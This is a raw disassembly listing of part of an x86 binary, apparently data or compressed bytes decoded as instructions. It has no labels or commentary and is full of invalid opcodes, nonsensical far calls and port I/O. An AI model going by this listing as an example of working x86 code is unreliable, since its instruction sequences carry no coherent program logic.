  47777d:	cmp    DWORD PTR [edx-0x594f71b9],edx
  477783:	xchg   ebx,eax
  477784:	cmc    
  477785:	inc    edx
  477786:	inc    eax
  477787:	jb     0x4777ed
  477789:	out    0x35,eax
  47778b:	call   0x29d99f1d
  477790:	loope  0x477756
  477792:	loopne 0x4777ab
  477794:	(bad)  
  477795:	mov    eax,0x2325d802
  47779a:	jg     0x47781b
  47779c:	pushf  
  47779d:	xchg   ebx,eax
  47779e:	mov    ds,WORD PTR [edx+ebx*4+0x4723c918]
  4777a5:	repnz out 0x93,al
  4777a8:	xchg   ebx,eax
  4777a9:	fs sbb eax,0xb217c493
  4777af:	lea    ebx,[ebx+esi*8]
  4777b2:	pop    ebp
  4777b3:	sub    BYTE PTR [eax+0x1b240626],0x92
  4777ba:	mov    ebx,0x6b61f68
  4777bf:	int3   
  4777c0:	fdiv   QWORD PTR [ebx]
  4777c2:	fsubr  st(7),st
  4777c4:	ds push ss
  4777c6:	mov    dh,0x40
  4777c8:	push   cs
  4777c9:	mov    dl,0x79
  4777cb:	in     al,dx
  4777cc:	das    
  4777cd:	dec    ebx
  4777ce:	adc    dl,BYTE PTR [eax]
  4777d0:	sbb    dh,bl
  4777d2:	mov    ecx,0x17d66f92
  4777d7:	(bad)  
  4777d8:	dec    eax
  4777d9:	adc    al,BYTE PTR [esi]
  4777db:	xor    dh,BYTE PTR [edx-0x4c86b40f]
  4777e1:	or     esp,ebp
  4777e3:	sub    al,0xc9
  4777e5:	not    BYTE PTR [edi]
  4777e7:	lahf   
  4777e8:	mov    BYTE PTR [eax+ecx*4],ch
  4777eb:	lahf   
  4777ec:	(bad)  
  4777ed:	loopne 0x4777cf
  4777ef:	mov    bh,0xa
  4777f1:	into   
  4777f2:	fwait
  4777f3:	test   al,0x4f
  4777f5:	add    eax,0xc085a609
  4777fa:	rcr    bl,1
  4777fc:	or     esi,DWORD PTR [eax]
  4777fe:	rcr    DWORD PTR [esi],cl
  477800:	shr    DWORD PTR [ebx+ebx*4],1
  477803:	mov    eax,DWORD PTR [edx]
  477805:	jmp    0x477821
  477807:	push   ds
  477808:	push   ecx
  477809:	jne    0x47781b
  47780b:	jae    0x477811
  47780d:	add    ebx,0xffffffe8
  477810:	scas   eax,DWORD PTR es:[edi]
  477811:	arpl   dx,dx
  477813:	mov    ebp,0x495f464f
  477818:	inc    ebp
  477819:	pop    ebx
  47781a:	nop    DWORD PTR [eax-0x1a]
  47781e:	xor    DWORD PTR [edx-0x6c877dc1],edi
  477824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  477825:	mov    esi,0x9866745c
  47782a:	sbb    ebx,DWORD PTR [ebx-0x4a]
  47782d:	pop    ebx
  47782e:	push   ss
  47782f:	sbb    eax,0x685d08d2
  477834:	push   esi
  477835:	dec    ecx
  477836:	push   edi
  477837:	xchg   edi,ebx
  477839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47783a:	or     dh,cl
  47783c:	popw   ds
  47783e:	mov    esp,0xe6461ddc
  477843:	jns    0x477891
  477845:	cmp    al,0xdc
  477847:	sub    BYTE PTR [ebp-0x56],dl
  47784a:	and    al,0x9a
  47784c:	mov    WORD PTR [eax],cs
  47784e:	pop    esp
  47784f:	ss add eax,0xf7e428f2
  477855:	rol    BYTE PTR [esi+ebp*2],1
  477858:	rcl    BYTE PTR [ecx],1
  47785a:	sub    al,BYTE PTR [edx-0x54ed1202]
  477860:	fdiv   QWORD PTR [eax+0x7f5e4f23]
  477866:	fcom   QWORD PTR [esi]
  477868:	call   0x7c84:0x20f19ca8
  47786f:	add    al,BYTE PTR [esp+ebp*1-0x2]
  477873:	in     eax,dx
  477874:	in     eax,0x2f
  477876:	in     al,dx
  477877:	or     BYTE PTR [ebx-0x235361e5],dh
  47787d:	paddd  mm6,QWORD PTR [esi-0x6f1025cf]
  477884:	in     eax,0x16
  477886:	jno    0x477862
  477888:	data16 or dl,BYTE PTR [eax-0x66]
  47788c:	or     edx,DWORD PTR [ecx+0x7542ab0]
  477892:	paddsw mm4,mm3
  477895:	repnz or eax,0xb63443c8
  47789b:	gs pop ss
  47789d:	(bad)  
  47789e:	fcomp  st(1)
  4778a0:	cmp    edx,DWORD PTR [edi-0x20]
  4778a3:	adc    al,cl
  4778a5:	sub    al,0x7e
  4778a7:	or     al,0xf6
  4778a9:	push   es
  4778aa:	(bad)  
  4778ab:	lods   eax,DWORD PTR ds:[esi]
  4778ac:	push   eax
  4778ad:	or     eax,0x99466de3
  4778b2:	out    dx,al
  4778b3:	xlat   BYTE PTR ds:[ebx]
  4778b4:	mov    edx,0x40dd243
  4778b9:	and    DWORD PTR [edx-0x4a],ebp
  4778bc:	call   0x2d21:0x27b4efd
  4778c3:	in     eax,0x26
  4778c5:	adc    dh,cl
  4778c7:	test   eax,0xec98c97
  4778cc:	test   BYTE PTR [ebx+0x4ccb3c0f],0xfc
  4778d3:	or     eax,0x78dd5b0b
  4778d8:	(bad)  
  4778d9:	adc    eax,0xee66cf66
  4778de:	imul   esp,esi,0x20324588
  4778e4:	mov    ch,0xf1
  4778e6:	push   cs
  4778e7:	dec    ebx
  4778e8:	inc    esi
  4778e9:	call   0x9f6:0x89f636cb
  4778f0:	jnp    0x477924
  4778f2:	push   ebx
  4778f3:	pop    ebp
  4778f4:	imul   ebx,DWORD PTR [ebx-0xe],0xfffffff1
  4778f8:	inc    edx
  4778f9:	push   cs
  4778fa:	and    BYTE PTR [edi],al
  4778fc:	enter  0x2ef,0xb5
  477900:	call   0x2d43:0xbf218796
  477907:	xor    ebx,DWORD PTR [edx+0x25e22896]
  47790d:	jnp    0x4778d7
  47790f:	jno    0x477913
  477911:	call   0x23c9:0xe0ad066
  477918:	dec    eax
  477919:	int    0x9a
  47791b:	call   0x2b62:0xcb96
  477921:	dec    eax
  477922:	imul   ebx,DWORD PTR ds:0x1ef1e0b2,0xffffff97
  477929:	adc    BYTE PTR [ebp+0x660b2086],cl
  47792f:	cwd    
  477931:	adc    ecx,DWORD PTR [ecx+0x3050ca50]
  477937:	iret   
  477938:	adc    edi,edx
  47793a:	xchg   ebx,eax
  47793b:	stos   BYTE PTR es:[edi],al
  47793c:	push   eax
  47793d:	pop    ss
  47793e:	cmp    esp,eax
  477940:	pop    es
  477941:	cwde   
  477942:	(bad)  
  477943:	(bad)  
  477944:	(bad)  
  477945:	jg     0x4779b7
  477947:	mov    esi,0xd9e25179
  47794c:	mov    edx,DWORD PTR [ecx]
  47794e:	(bad)  [ecx+eiz*1+0xed9e1b4]
  477955:	mov    ebp,ds
  477957:	or     al,0xd1
  477959:	dec    ecx
  47795a:	hlt    
  47795b:	add    dl,BYTE PTR [edi]
  47795d:	cmp    ebx,DWORD PTR [ecx+0x51]
  477960:	mov    al,ds:0x2e25579
  477965:	(bad)  
  477966:	in     eax,dx
  477967:	popa   
  477968:	ja     0x477983
  47796a:	jmp    0x69646b6c
  47796f:	cld    
  477970:	sbb    BYTE PTR [ecx-0x2c],cl
  477973:	mov    al,ds:0x6031912c
  477978:	out    0xa4,al
  47797a:	push   cs
  47797b:	add    eax,0x17adf4ff
  477980:	jnp    0x47793f
  477982:	shl    DWORD PTR [edx-0x34b81cee],1
  477988:	pop    ds
  477989:	cmc    
  47798a:	pop    ds
  47798b:	pop    esp
  47798c:	popa   
  47798d:	(bad)  
  47798e:	(bad)
  477992:	jb     0x477922
  477994:	add    BYTE PTR [ecx+0x3cf01ce1],bl
  47799a:	imul   ch
  47799c:	imul   edx,DWORD PTR [ebp-0x4f],0xffffffa9
  4779a0:	loop   0x4779ca
  4779a2:	bound  edx,QWORD PTR es:[ebp*8-0x2010eda1]
  4779aa:	inc    ebp
  4779ab:	lock inc esi
  4779ad:	sahf   
  4779ae:	(bad)  
  4779af:	imul   eax,ebp,0x693179d5
  4779b5:	cs push cs
  4779b7:	std    
  4779b8:	jmp    FWORD PTR [edi-0x1]
  4779bb:	imul   edx,DWORD PTR [ecx-0x47de6910],0xffffff8d
  4779c2:	loope  0x477a2b
  4779c4:	das    
  4779c5:	inc    esp
  4779c6:	pop    esp
  4779c7:	loope  0x477a0d
  4779c9:	sbb    al,0x59
  4779cb:	xchg   edx,eax
  4779cc:	push   ss
  4779cd:	mov    ch,0x75
  4779cf:	les    ebx,FWORD PTR [ebx-0x1e029682]
  4779d5:	xor    BYTE PTR [eax+0x7f24a8e7],al
  4779db:	popa   
  4779dc:	test   eax,0x26428f21
  4779e1:	add    bl,dl
  4779e3:	jecxz  0x477973
  4779e5:	xchg   edi,eax
  4779e6:	in     al,0x7
  4779e8:	push   edx
  4779e9:	xchg   ebx,eax
  4779ea:	call   0x7b0e:0x79a20c86
  4779f1:	xchg   edx,eax
  4779f2:	push   ds
  4779f3:	cmp    eax,0xd70f168b
  4779f8:	fsub   st(0),st
  4779fa:	out    dx,eax
  4779fb:	add    eax,0x5b0f6221
  477a00:	mov    esp,0xb55ed598
  477a05:	pop    DWORD PTR [ebp+0x62]
  477a08:	fs in  eax,dx
  477a0a:	add    eax,0x7ee56795
  477a0f:	cli    
  477a10:	pop    ebx
  477a11:	retf   0xf291
  477a14:	xchg   ebp,eax
  477a15:	enter  0x14c8,0x32
  477a19:	xchg   ebp,eax
  477a1a:	pop    ebp
  477a1b:	ins    BYTE PTR es:[edi],dx
  477a1c:	pop    edx
  477a1d:	xor    ch,al
  477a1f:	and    al,0x7
  477a21:	mov    al,ds:0x4dc6987b
  477a26:	add    eax,0x315c018d
  477a2b:	inc    edi
  477a2c:	pop    eax
  477a2d:	(bad)  
  477a2e:	jg     0x4779eb
  477a30:	js     0x477a67
  477a32:	jmp    FWORD PTR [ecx+0x41]
  477a35:	pop    ebx
  477a36:	jmp    0x45d13bc6
  477a3b:	sbb    al,0x60
  477a3d:	pop    ebp
  477a3e:	and    DWORD PTR [ecx+0x78de0e66],edi
  477a44:	pop    ebp
  477a45:	or     DWORD PTR [eax-0x2ed7b6e5],ecx
  477a4b:	jnp    0x477a04
  477a4d:	jl     0x477a52
  477a4f:	mov    cl,0xf1
  477a51:	rcl    BYTE PTR [edx-0x67584014],1
  477a57:	in     al,dx
  477a58:	push   eax
  477a59:	xchg   edx,eax
  477a5a:	dec    ecx
  477a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  477a5c:	lods   al,BYTE PTR ds:[esi]
  477a5d:	mov    edi,0xd22fe819
  477a62:	xor    ecx,ebp
  477a64:	mov    WORD PTR [ecx+0x21],es
  477a67:	cmp    ecx,ebx
  477a69:	ss inc ecx
  477a6b:	pop    ss
  477a6c:	mov    eax,DWORD PTR [esi]
  477a6e:	jmp    0xc227ef6
  477a73:	mov    ch,0x14
  477a75:	xsaveopt [edx-0x36fb8325]
  477a7c:	pop    eax
  477a7d:	in     al,dx
  477a7e:	xchg   BYTE PTR [ebp+0x235b8f4],al
  477a84:	push   ds
  477a85:	or     dh,cl
  477a87:	xchg   BYTE PTR [esp+ebp*2+0x76],ah
  477a8b:	loope  0x477ac1
  477a8d:	xor    ebx,edi
  477a8f:	shr    DWORD PTR [edi-0x1],1
  477a92:	mov    bh,0x4b
  477a94:	rol    DWORD PTR [ebx],0xbe
  477a97:	mov    cl,0xe9
  477a99:	or     al,0x24
  477a9b:	push   cs
  477a9c:	or     al,0xa1
  477a9e:	popa   
  477a9f:	jge    0x477b11
  477aa1:	push   ecx
  477aa2:	hlt    
  477aa3:	shl    DWORD PTR ds:0x1b6cbed6,0x51
  477aaa:	mov    DWORD PTR [ecx-0x66],eax
  477aad:	jnp    0x477ae3
  477aaf:	cmp    al,0xbb
  477ab1:	xlat   BYTE PTR ds:[ebx]
  477ab2:	ins    BYTE PTR es:[edi],dx
  477ab3:	mov    cl,0xf3
  477ab5:	mov    BYTE PTR [ebx+0x13],bl
  477ab8:	sbb    DWORD PTR [edx+0x58],ebx
  477abb:	push   ss
  477abc:	push   ss
  477abd:	pushf  
  477abe:	pop    edi
  477abf:	lock out dx,eax
  477ac1:	sbb    bh,BYTE PTR [ebx+0x3d]
  477ac4:	fistp  QWORD PTR [ebx+0x3f]
  477ac7:	lds    esi,FWORD PTR [edi]
  477ac9:	push   ss
  477aca:	mov    esp,0x1408391a
  477acf:	push   ss
  477ad0:	ss fs jae 0x477aef
  477ad4:	fistp  WORD PTR [edi+0xa9b8107]
  477ada:	fdivr  DWORD PTR [ecx+0xf3eded0]
  477ae0:	ret    
  477ae1:	mov    ch,0x48
  477ae3:	call   0xd97ac3f6
  477ae8:	popa   
  477ae9:	mov    ch,0x1e
  477aeb:	sti    
  477aec:	cmp    dl,BYTE PTR [edi-0x48dbccc]
  477af2:	fwait
  477af3:	and    al,0x9b
  477af5:	jb     0x477b3c
  477af7:	jb     0x477b52
  477af9:	hlt    
  477afa:	fcmovne st,st(6)
  477afc:	add    al,BYTE PTR [edi+0x72]
  477aff:	adc    al,0xdb
  477b01:	sti    
  477b02:	jno    0x477acd
  477b04:	xchg   ecx,eax
  477b05:	or     al,0x44
  477b07:	sti    
  477b08:	fwait
  477b09:	sbb    edx,DWORD PTR [edi]
  477b0b:	xor    dl,BYTE PTR [eax]
  477b0d:	fwait
  477b0e:	add    al,0x49
  477b10:	push   ss
  477b11:	rol    al,1
  477b13:	pop    ebx
  477b14:	sbb    eax,0x219b60e2
  477b19:	stc    
  477b1a:	xchg   edi,eax
  477b1b:	push   0x7591c86e
  477b20:	pop    ecx
  477b21:	push   ds
  477b22:	fwait
  477b23:	je     0x477ac7
  477b25:	les    ecx,FWORD PTR [edx]
  477b27:	in     al,0x54
  477b29:	(bad)  
  477b2b:	mov    eax,0x3c5e0247
  477b30:	jmp    0x477ac5
  477b32:	and    BYTE PTR [ebx+0x4f],cl
  477b35:	and    al,0xe0
  477b37:	test   BYTE PTR [ebp*8-0x1e191e09],al
  477b3e:	mov    esi,0x3e835e2d
  477b43:	mov    ds:0xc0046420,eax
  477b48:	nop
  477b49:	scas   eax,DWORD PTR es:[edi]
  477b4a:	fisttp WORD PTR [esi-0x4496ee5c]
  477b51:	mov    ah,BYTE PTR ds:0x37dc115b
  477b57:	pop    edi
  477b58:	jnp    0x477b70
  477b5a:	xor    BYTE PTR [ecx],ah
  477b5c:	sub    ah,al
  477b5e:	adc    DWORD PTR [ebx],ecx
  477b60:	js     0x477b58
  477b62:	pop    esp
  477b63:	push   cs
  477b64:	pushf  
  477b65:	jb     0x477bc6
  477b67:	imul   edx,DWORD PTR [ebx],0x65
  477b6a:	outs   dx,DWORD PTR ds:[esi]
  477b6b:	enter  0x5f09,0x6b
  477b6f:	cmovge ecx,DWORD PTR ds:[edx]
  477b73:	fiadd  DWORD PTR [esi+0xb1b5f7e]
  477b79:	mov    ds:0xfb0d09e4,al
  477b7e:	or     dl,BYTE PTR [ebx+0x4ba640d3]
  477b84:	dec    edi
  477b85:	xchg   edx,eax
  477b86:	js     0x477b9b
  477b88:	loopne 0x477be0
  477b8a:	sub    esp,DWORD PTR [ebx]
  477b8c:	mul    DWORD PTR [ecx+0x66]
  477b8f:	sti    
  477b90:	lds    eax,FWORD PTR [ecx+0x1c43adb3]
  477b96:	stos   DWORD PTR es:[edi],eax
  477b97:	jl     0x477bff
  477b99:	jae    0x477b4e
  477b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  477b9c:	adc    DWORD PTR [edi+0x794c1ed1],ebx
  477ba2:	sahf   
  477ba3:	fist   WORD PTR [esp+ecx*2+0x4ce65e90]
  477baa:	sbb    al,0x1c
  477bac:	out    0xb6,al
  477bae:	out    0x97,al
  477bb0:	adc    al,0x26
  477bb2:	sbb    ebp,DWORD PTR [edx+edx*1]
  477bb5:	push   ecx
  477bb6:	cmp    ebp,0x3f
  477bb9:	inc    esp
  477bba:	lods   al,BYTE PTR ds:[esi]
  477bbb:	loopne 0x477c33
  477bbd:	psubsw mm0,QWORD PTR [ebx+ebx*1+0x13]
  477bc2:	les    esp,FWORD PTR [ecx+0x17bd691c]
  477bc8:	jmp    0x360a:0x691b45f0
  477bcf:	dec    ebx
  477bd0:	and    DWORD PTR [eax-0x412ed517],ebp
  477bd6:	jge    0x477c40
  477bd8:	sbb    dh,BYTE PTR [esp+ebp*4]
  477bdb:	or     al,0x1a
  477bdd:	pop    ebx
  477bde:	loopne 0x477c3d
  477be0:	mov    DWORD PTR [edi+edi*8],eax
  477be3:	inc    esi
  477be4:	mov    edx,0x89253042
  477be9:	or     BYTE PTR [edx],bl
  477beb:	sbb    ebp,0x29
  477bee:	sbb    BYTE PTR [edx],ch
  477bf0:	mov    dh,0xaf
  477bf2:	add    BYTE PTR [esi+0xa],dl
  477bf5:	jmp    0xedc74d3f
  477bfa:	adc    dl,ch
  477bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  477bfd:	fcomp  DWORD PTR [edi+0x4]
  477c00:	aaa    
  477c01:	and    ecx,ebp
  477c03:	lea    eax,[edx]
  477c05:	(bad)  
  477c06:	fstp   st(5)
  477c08:	or     esp,DWORD PTR [edx+0x79]
  477c0b:	ficomp DWORD PTR [edi]
  477c0d:	fdivr  QWORD PTR [ecx+0x5a]
  477c10:	dec    edi
  477c11:	add    eax,0xd921fdd9
  477c16:	imul   eax,DWORD PTR [eax],0xffffffdd
  477c19:	sti    
  477c1a:	rol    DWORD PTR [eax+0x25],1
  477c1d:	(bad)  
  477c1f:	jno    0x477c17
  477c21:	imul   ebx,esp,0x8d831777
  477c27:	int3   
  477c28:	and    DWORD PTR [ebx-0x4b905ec2],edi
  477c2e:	outs   dx,DWORD PTR ds:[esi]
  477c2f:	jl     0x477c8a
  477c31:	mov    edx,0x691f3c5f
  477c36:	fwait
  477c37:	hlt    
  477c38:	sub    eax,0x3db33e17
  477c3d:	idiv   DWORD PTR [eax+0x5f]
  477c40:	sub    al,0xe5
  477c42:	push   ebp
  477c43:	add    eax,0x1a580915
  477c48:	iret   
  477c49:	je     0x477c51
  477c4b:	dec    edx
  477c4c:	or     DWORD PTR [eax],ebx
  477c4e:	pop    edx
  477c4f:	icebp  
  477c50:	js     0x477c40
  477c52:	popf   
  477c53:	loope  0x477c5d
  477c55:	sub    edx,DWORD PTR [ebx+0x5534061d]
  477c5b:	outs   dx,DWORD PTR ds:[esi]
  477c5c:	cdq    
  477c5d:	lods   al,BYTE PTR ds:[esi]
  477c5e:	(bad)  
  477c60:	or     BYTE PTR [ebx+ebp*1],ah
  477c63:	dec    eax
  477c64:	sbb    bh,BYTE PTR [ebx]
  477c66:	jle    0x477c62
  477c68:	jnp    0x477c30
  477c6a:	adc    eax,0x5fc85bd2
  477c6f:	jnp    0x477bfa
  477c71:	shr    BYTE PTR [eax+eiz*2],0xa9
  477c75:	pop    edx
  477c76:	int    0x2c
  477c78:	sahf   
  477c79:	dec    eax
  477c7a:	sahf   
  477c7b:	push   eax
  477c7c:	das    
  477c7d:	cmp    ebx,DWORD PTR [esi+eiz*4]
  477c80:	xchg   ecx,eax
  477c81:	mov    esp,0x692390a
  477c86:	pushf  
  477c87:	in     eax,0x10
  477c89:	popf   
  477c8a:	push   ds
  477c8b:	test   BYTE PTR [eax+ebp*8-0x162163ad],bl
  477c92:	rol    DWORD PTR [esi-0x5e9e2585],cl
  477c98:	sub    ebp,DWORD PTR [edx+edx*2-0x76a35c4b]
  477c9f:	int    0x18
  477ca1:	int    0x6e
  477ca3:	inc    DWORD PTR [edx]
  477ca5:	dec    ebx
  477ca6:	mov    dl,0x2b
  477ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  477ca9:	sbb    al,0xe6
  477cab:	jne    0x477d2c
  477cad:	sti    
  477cae:	(bad)  
  477caf:	adc    esp,DWORD PTR [esi-0x44]
  477cb2:	nop
  477cb3:	pop    esp
  477cb4:	movsx  ebp,BYTE PTR [ecx+0x39]
  477cb8:	imul   edx,DWORD PTR [edx-0x28],0xb252e569
  477cbf:	push   ecx
  477cc0:	(bad)  
  477cc2:	out    dx,eax
  477cc3:	popf   
  477cc4:	sbb    BYTE PTR [edi],al
  477cc6:	xchg   edx,eax
  477cc7:	out    dx,eax
  477cc8:	frstor ds:0x9c84cc5d
  477cce:	pop    esp
  477ccf:	out    0xdd,al
  477cd1:	and    BYTE PTR [ebx+ecx*1-0x6],0xdb
  477cd6:	test   DWORD PTR ds:0xd502662a,ebx
  477cdc:	retf   0x3b91
  477cdf:	aaa    
  477ce0:	mov    al,ds:0x6689a110
  477ce5:	sub    al,0x1a
  477ce7:	fld    TBYTE PTR ds:0x5c8ad049
  477ced:	adc    esi,ebx
  477cef:	sub    eax,0xf78c8212
  477cf4:	cmp    cl,BYTE PTR [ebx]
  477cf6:	or     dl,BYTE PTR [edi-0x37]
  477cf9:	or     DWORD PTR [ebx+0x661e6b97],eax
  477cff:	sub    al,0xe2
  477d01:	or     edi,DWORD PTR [ecx+0x5]
  477d04:	data16 sub al,0x36
  477d07:	mov    ?,WORD PTR [ebp-0x7a7d845e]
  477d0d:	ins    DWORD PTR es:[edi],dx
  477d0e:	(bad)  [ebx-0x64]
  477d11:	adc    bh,BYTE PTR [esi+eax*4+0x66848064]
  477d18:	pop    esp
  477d19:	and    dl,BYTE PTR [edi]
  477d1b:	and    DWORD PTR [edi+0x66334542],ecx
  477d21:	fwait
  477d22:	add    al,0x2f
  477d24:	leave  
  477d25:	icebp  
  477d26:	aad    0xc
  477d28:	and    al,0xa
  477d2a:	shr    BYTE PTR [eax+eiz*1-0x3f],0x24
  477d2f:	sbb    edi,DWORD PTR [ebx]
  477d31:	leave  
  477d32:	ret    0xe18b
  477d35:	or     dh,ch
  477d37:	mov    eax,ds:0x2e1f0d52
  477d3c:	sbb    DWORD PTR [ebx+0x2f26a1e4],ebx
  477d42:	mov    eax,ds:0x164ec41
  477d47:	dec    ecx
  477d48:	dec    edx
  477d49:	aam    0x84
  477d4b:	adc    bl,BYTE PTR [eax+0x70]
  477d4e:	daa    
  477d4f:	sar    DWORD PTR [esi],0xb6
  477d52:	or     esi,DWORD PTR [edx]
  477d54:	jne    0x477d2f
  477d56:	vmwrite esp,DWORD PTR [ebx+edi*1]
  477d5a:	shl    DWORD PTR [ecx],1
  477d5c:	aad    0xd4
  477d5e:	mov    al,0x93
  477d60:	(bad)  
  477d61:	adc    esp,DWORD PTR [ebx]
  477d63:	fisttp DWORD PTR [ebx+0x400ef74d]
  477d69:	jge    0x477db4
  477d6b:	sub    DWORD PTR [edi-0x2a7db6ae],0xe32b33
  477d75:	das    
  477d76:	add    DWORD PTR [eax+0x75],edi
  477d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  477d7a:	les    ebx,FWORD PTR [edi+0x2457526f]
  477d80:	mov    ds:0x6465499c,al
  477d85:	or     dh,0xe0
  477d88:	pop    ebx
  477d89:	xor    eax,0x90c1af8f
  477d8e:	jae    0x477d13
  477d90:	add    DWORD PTR [edi-0x60],ebx
  477d93:	out    dx,al
  477d94:	fiadd  DWORD PTR [ebp+0x52e40b8a]
  477d9a:	loopne 0x477da2
  477d9c:	out    dx,al
  477d9d:	or     al,0xd9
  477d9f:	cli    
  477da0:	pop    edi
  477da1:	pop    es
  477da2:	sub    al,0x60
  477da4:	jb     0x477da3
  477da6:	loope  0x477d29
  477da8:	fimul  WORD PTR ds:0x901be419
  477dae:	push   ss
  477daf:	fidiv  WORD PTR [eax]
  477db1:	add    al,0xb
  477db3:	test   eax,0x69a22dda
  477db8:	mov    esp,0x73267a1
  477dbd:	enter  0x9165,0x1f
  477dc1:	pushf  
  477dc2:	xchg   ebx,eax
  477dc3:	data16 mov cl,0xd5
  477dc6:	jno    0x477e26
  477dc8:	or     BYTE PTR [edx+esi*8],0x1c
  477dcc:	pop    esi
  477dcd:	adc    dh,bl
  477dcf:	dec    esi
  477dd0:	ds pop ss
  477dd2:	jb     0x477dfa
  477dd4:	sub    ebp,DWORD PTR es:[edi+0x39299022]
  477ddb:	inc    eax
  477ddc:	loope  0x477d81
  477dde:	add    BYTE PTR [ecx-0xe],bh
  477de1:	cmp    DWORD PTR [ebx-0xec150c1],esp
  477de7:	pop    es
  477de8:	jns    0x477e18
  477dea:	xor    esi,DWORD PTR fs:[ebx]
  477ded:	inc    esp
  477dee:	dec    edi
  477def:	icebp  
  477df0:	enter  0xc94,0x20
  477df4:	shl    DWORD PTR [esp+ecx*4-0x4be30df4],1
  477dfb:	push   eax
  477dfc:	push   ebx
  477dfd:	jno    0x477df1
  477dff:	pop    esp
  477e00:	enter  0xa85,0xa
  477e04:	popa   
  477e05:	jb     0x477e27
  477e07:	or     DWORD PTR [eax+eiz*2],0x61
  477e0b:	rcl    DWORD PTR [esi],0xe
  477e0e:	sbb    ecx,DWORD PTR gs:[edx]
  477e11:	popa   
  477e12:	gs inc ebp
  477e14:	ror    DWORD PTR [eax],0x92
  477e17:	mov    al,ds:0xcdbd0e67
  477e1c:	fs retf 
  477e1e:	fisubr WORD PTR [ebx+0x1d]
  477e21:	mov    esp,ecx
  477e23:	test   BYTE PTR [edx],al
  477e25:	nop
  477e26:	mov    eax,ds:0xc903af92
  477e2b:	push   eax
  477e2c:	leave  
  477e2d:	out    0xd1,al
  477e2f:	dec    ebx
  477e30:	mov    edi,0x870241f7
  477e35:	push   esp
  477e36:	scas   al,BYTE PTR es:[edi]
  477e37:	in     eax,0xc1
  477e39:	stos   BYTE PTR es:[edi],al
  477e3a:	test   DWORD PTR ds:0x4b887cc1,ebx
  477e40:	xor    dh,0x90
  477e43:	popa   
  477e44:	clc    
  477e45:	iret   
  477e46:	or     DWORD PTR [esi*4-0x50fa4a60],ecx
  477e4d:	mov    DWORD PTR [ebp-0x48],esp
  477e50:	or     ch,BYTE PTR [eax-0x4c]
  477e53:	push   ebp
  477e54:	push   es
  477e55:	dec    edi
  477e56:	push   ebp
  477e57:	ss mov edx,0x56ba5faa
  477e5d:	loopne 0x477e66
  477e5f:	push   0xa8eb2741
  477e64:	xchg   ecx,eax
  477e65:	jne    0x477e3c
  477e67:	push   es
  477e68:	push   ebp
  477e69:	stos   BYTE PTR es:[edi],al
  477e6a:	sbb    al,0x73
  477e6c:	and    BYTE PTR [edx],dl
  477e6e:	fcomi  st,st(6)
  477e70:	mov    dh,0x1d
  477e72:	data16 add al,BYTE PTR [esp+ebx*1-0x1f]
  477e77:	es scas al,BYTE PTR es:[edi]
  477e79:	add    esp,DWORD PTR [eax-0x2a]
  477e7c:	mov    dh,0x1b
  477e7e:	aam    0xff
  477e80:	mov    ah,0xe1
  477e82:	imul   edx,DWORD PTR es:[ecx],0x26
  477e86:	or     ch,BYTE PTR [edi+ebp*4-0x7f]
  477e8a:	aam    0x92
  477e8c:	pop    es
  477e8d:	mov    edi,0x7967966f
  477e92:	adc    eax,DWORD PTR [ecx+edx*4+0x1451c48e]
  477e99:	pop    ebx
  477e9a:	stos   DWORD PTR es:[edi],eax
  477e9b:	(bad)  
  477e9c:	inc    BYTE PTR [ebx-0x6]
  477e9f:	add    al,0x6b
  477ea1:	loope  0x477e8c
  477ea3:	mov    ebp,0x84b85b51
  477ea8:	jge    0x477eba
  477eaa:	ret    0x1c03
  477ead:	scas   al,BYTE PTR es:[edi]
  477eae:	jns    0x51399afa
  477eb4:	int    0x82
  477eb6:	sub    DWORD PTR [ebx],esp
  477eb8:	stos   BYTE PTR es:[edi],al
  477eb9:	sbb    al,0x81
  477ebb:	dec    ebp
  477ebc:	or     BYTE PTR [edi],al
  477ebe:	or     ebp,DWORD PTR es:[esi+0x9e6c11a]
  477ec5:	mov    ah,0xf1
  477ec7:	(bad)  
  477ec9:	loop   0x477efb
  477ecb:	lahf   
  477ecc:	mov    eax,0x59657843
  477ed1:	jnp    0x477f0f
  477ed3:	and    edx,ebx
  477ed5:	push   ds
  477ed6:	test   DWORD PTR [ecx+0x43],edx
  477ed9:	sbb    dh,bl
  477edb:	xor    dh,BYTE PTR [edi-0x6d]
  477ede:	pop    es
  477edf:	inc    edx
  477ee0:	push   ds
  477ee1:	jo     0x477ea7
  477ee3:	mov    dl,0x21
  477ee5:	aad    0xe7
  477ee7:	push   es
  477ee8:	mov    WORD PTR [edx+0x9],?
  477eeb:	ja     0x477e98
  477eed:	dec    esp
  477eee:	adc    al,0xf2
  477ef0:	cdq    
  477ef1:	or     al,0xba
  477ef3:	add    al,0x3
  477ef5:	(bad)  
  477ef6:	cli    
  477ef7:	mov    dl,0x3
  477ef9:	cwde   
  477efa:	ins    BYTE PTR es:[edi],dx
  477efb:	retf   
  477efc:	push   ss
  477efd:	comiss xmm4,DWORD PTR [edx-0x76f44e7d]
  477f04:	adc    DWORD PTR [edx+0x4b],ebp
  477f07:	add    ecx,edx
  477f09:	inc    eax
  477f0a:	sahf   
  477f0b:	cmp    al,0x2f
  477f0d:	ret    0x5303
  477f10:	cmc    
  477f11:	mov    ds:0x676437bc,al
  477f16:	pop    esi
  477f17:	adc    edx,ebp
  477f19:	push   cs
  477f1a:	inc    eax
  477f1b:	loope  0x477f5d
  477f1d:	ds sbb eax,0xe2b24aca
  477f23:	jmp    0x21d9:0x72573b48
  477f2a:	aas    
  477f2b:	add    eax,0x81d13c9b
  477f30:	shr    esp,0xf9
  477f33:	rcl    BYTE PTR [eax+0x54],0x8
  477f37:	adc    eax,DWORD PTR [eax-0xfcb58be]
  477f3d:	inc    eax
  477f3e:	enter  0x938c,0x81
  477f42:	jnp    0x477ee5
  477f44:	push   es
  477f45:	and    al,0xe8
  477f47:	repz cmp eax,0xa0099745
  477f4d:	test   DWORD PTR [ebx+0xb],edi
  477f50:	add    DWORD PTR ds:0x827c20b9,esp
  477f56:	add    DWORD PTR es:[edi-0x2a8d61b4],ecx
  477f5d:	sub    BYTE PTR [eax+eax*1+0x79],ah
  477f61:	dec    edx
  477f62:	sbb    ebx,DWORD PTR [esi-0x31b02a6e]
